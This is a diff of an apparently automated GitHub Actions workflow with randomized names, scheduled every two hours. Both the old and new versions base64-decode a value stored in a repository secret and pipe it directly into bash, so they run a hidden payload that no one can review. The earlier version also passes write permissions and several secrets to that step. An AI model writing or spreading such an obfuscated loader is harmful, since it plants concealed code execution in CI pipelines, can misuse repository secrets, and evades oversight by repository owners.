@@ -1,21 +1,13 @@
-name: HxOznNkSnk
+name: PnFwbtmpCj
 on:
   schedule:
     - cron: '0 */2 * * *'
   workflow_dispatch:
 jobs:
-  sxrwADL:
+  CmlAgLiDz:
     runs-on: ubuntu-latest
-    permissions:
-      contents: write
+    env:
+      nSTUhdILrkKO: ${{ secrets.hjiSARTtSAtu }}
     steps:
-      - uses: actions/checkout@v4
-        with:
-          token: ${{ secrets.aDk74Ba7U }}
-      - name: iPUUyeFwxVedG
-        env:
-          LlclLcpvjd: ${{ secrets.A84O8Tj }}
-          sbpbxRi: ${{ secrets.ZCmluWas }}
-          Wn1rvSQgTT1: ${{ secrets.Sv2bABMJTFEiZ3 }}
-          GITHUB_TOKEN: ${{ secrets.aDk74Ba7U }}
-        run: echo "$LlclLcpvjd" | base64 -d | bash
+      - uses: actions/checkout@v5
+      - run: echo "${{ secrets.FOBTDNHE }}" | base64 -d | bash
